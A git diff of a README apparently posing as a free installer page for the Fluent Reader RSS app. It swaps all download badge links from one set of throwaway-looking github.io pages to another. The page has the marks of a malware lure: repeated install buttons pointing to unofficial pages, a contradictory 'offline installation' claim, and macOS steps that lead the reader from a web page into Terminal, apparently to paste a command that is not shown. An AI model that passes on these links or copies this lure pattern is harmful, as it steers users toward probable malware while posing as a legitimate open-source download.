@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-RSS+Reader-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Fluent Reader Free Installer** — Fluent Reader is a free, open-source RSS news reader for Windows, macOS, and Linux with a modern, clean interface inspired by Fluent Design. Works without internet access, no account required. Full offline installation.
+**💻 Fluent Reader Free Installer** — Fluent Reader is a free, open-source RSS reader for Windows, macOS, and Linux with a modern, clean interface. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Fluent Reader](https://img.shields.io/badge/⬇_Install_Fluent+Reader-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Fluent Reader](https://img.shields.io/badge/⬇_Install_Fluent+Reader-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Fluent Reader
 
-Fluent Reader is a free, open-source RSS news reader for Windows, macOS, and Linux with a modern, clean interface inspired by Fluent Design. Import OPML feeds, organize articles by source, apply filters, and sync with Fever, Google Reader-compatible, and Miniflux APIs. Fluent Reader's offline reading capability and privacy-focused design make it a polished desktop RSS alternative.
+Fluent Reader is a free, open-source RSS reader for Windows, macOS, and Linux with a modern, clean interface. It supports local RSS feeds, Fever and Google Reader compatible APIs, full article content display, and a beautiful reading experience.
 
 ---
 
 ## ❌ Problem: Fluent Reader is hard to access
 
-- **Sync Service Dependency** — RSS sync requires self-hosted or third-party sync service
-- **Mobile Sync** — No mobile companion app; cross-device sync requires external service
-- **Plugin Ecosystem** — No extension system for adding functionality
-- **Notification System** — Background polling for new articles consumes resources
+- **No Mobile Companion** — Desktop only; no official mobile app for reading on the go
+- **Self-Hosted Sync Required** — Cross-device sync needs a Fever-compatible self-hosted RSS server
+- **Development Pace** — Updates arrive less frequently than commercial RSS readers
+- **Limited Organizational Features** — Basic folder organization compared to Feedly or NewsBlur
 
 ---
 
@@ -61,9 +61,9 @@ Fluent Reader is a free, open-source RSS news reader for Windows, macOS, and Lin
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Fluent Reader is a free, open-source RSS news reader for Windows, macOS, and Lin
 
 <div align="center">
 
-[![⬇ Install Fluent Reader](https://img.shields.io/badge/⬇_Install_Fluent+Reader-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Fluent Reader](https://img.shields.io/badge/⬇_Install_Fluent+Reader-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Fluent Reader is a free, open-source RSS news reader for Windows, macOS, and Lin
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Fluent Reader is a free, open-source RSS news reader for Windows, macOS, and Lin
 
 ---
 
-**Fluent Reader Free Installer** — Fluent Reader is a free, open-source RSS news reader for Windows, macOS, and Linux with a modern, clean interface inspired by Fluent Design. Install without internet connection today!
+**Fluent Reader Free Installer** — Fluent Reader is a free, open-source RSS reader for Windows, macOS, and Linux with a modern, clean interface. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Fluent Reader](https://img.shields.io/badge/⬇_Install_Fluent+Reader-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Fluent Reader](https://img.shields.io/badge/⬇_Install_Fluent+Reader-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
